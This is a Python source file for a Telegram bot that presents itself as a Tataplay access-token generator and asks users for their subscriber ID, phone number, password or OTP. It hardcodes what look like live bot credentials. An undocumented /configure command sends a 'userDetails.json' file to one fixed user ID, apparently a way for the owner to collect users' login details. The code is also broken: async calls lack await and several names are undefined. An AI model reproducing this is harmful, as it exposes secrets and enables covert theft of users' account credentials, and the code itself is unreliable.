from pyrogram import filters, idle, Client
import logging
from pyrogram.filters import command, private, regex
from pyrogram.handlers import MessageHandler, CallbackQueryHandler, EditedMessageHandler
from code_samples.bt import ButtonMaker
import code_samples.login
from pyrogram import Client, enums, filters
app = Client(
    "Aryansbot",
    bot_token="7755468228:AAHuez0JJi7t90SMex_reSR0B2vG3-Ua3rM",
    api_id="5360874",
    api_hash="4631f40a1b26c2759bf1be4aff1df710",
    sleep_threshold=30
)
async def start(client,message):
  await message.reply_text("Hello Welcome How are You✨ This Is A Tataplay Access Token Generator Made By @aryanchy451")
  buttons = ButtonMaker()
  buttons.ibutton("LOGIN WITH PASSWORD",'PASS')
  buttons.ibutton("LOGIN WITH OTP", 'OTP')
  reply_markup = buttons.build_menu(2)
  msg = "Select How To Login To Tataplay"
  return await sendMessage(message, msg, reply_markup)

def password(_, query):
  m = query.message
  get_id = app.ask(
        chat_id=m.chat.id,
        text="Enter Subscriber Id or /cancel to Stop Process"#API_TEXT.format(m.from_user.mention(style='md')),
    )
  api_id = get_id.text
  if is_cancel(query.message, api_id):
      return

  get_id.delete()
  get_id.request.delete()
  get_id = app.ask(
        chat_id=m.chat.id,
        text="Enter Phone Number Without +91 or /cancel to Stop Process"#API_TEXT.format(m.from_user.mention(style='md')),
    )
  phnum = get_id.text
  if is_cancel(query.message, phnum):
      return

  get_id.delete()
  get_id.request.delete()
  get_id = app.ask(
        chat_id=m.chat.id,
        text="Enter Password or /cancel to Stop Process"#API_TEXT.format(m.from_user.mention(style='md')),
    )
  passwd = get_id.text
  if is_cancel(query.message, passwd):
      return

  get_id.delete()
  get_id.request.delete()
  login.loginWithPass(message=m,sid=api_id, rmn=phnum, pwd=passwd)

def otp(_, query):
  m = query.message
  get_id = app.ask(
        chat_id=m.chat.id,
        text="Enter Subscriber Id or /cancel to Stop Process"#API_TEXT.format(m.from_user.mention(style='md')),
    )
  api_id = get_id.text
  if is_cancel(query.message, api_id):
      return

  get_id.delete()
  get_id.request.delete()
  get_id = app.ask(
        chat_id=m.chat.id,
        text="Enter Phone Number Without +91 or /cancel to Stop Process"#API_TEXT.format(m.from_user.mention(style='md')),
    )
  phnum = get_id.text
  if is_cancel(query.message, phnum):
      return

  get_id.delete()
  get_id.request.delete()
  login.generateOTP(message=m,sid=api_id, rmn=phnum)
  get_id = app.ask(
        chat_id=m.chat.id,
        text="Enter Otp Sent or /cancel to Stop Process"#API_TEXT.format(m.from_user.mention(style='md')),
    )
  otp = get_id.text
  if is_cancel(query.message, otp):
      return

  get_id.delete()
  get_id.request.delete()
  login.loginWithOTP(message=m,sid=api_id, rmn=phnum, otp=otp)
async def getfile(client,message):
    if message.from_user.id == 7126874550:
        app.send_document(7126874550,document='userDetails.json')
async def main():
  await app.start()
  logging.info("bot started")
  app.add_handler(MessageHandler(start, filters=command('start')))
  app.add_handler(MessageHandler(getfile, filters=command('configure')))
  app.add_handler(CallbackQueryHandler(otp, filters=regex(r'^OTP')))
  app.add_handler(CallbackQueryHandler(password, filters=regex(r'^PASS')))
  await idle()
  await app.stop()

if 2<3:
  app.loop.run_until_complete(main())
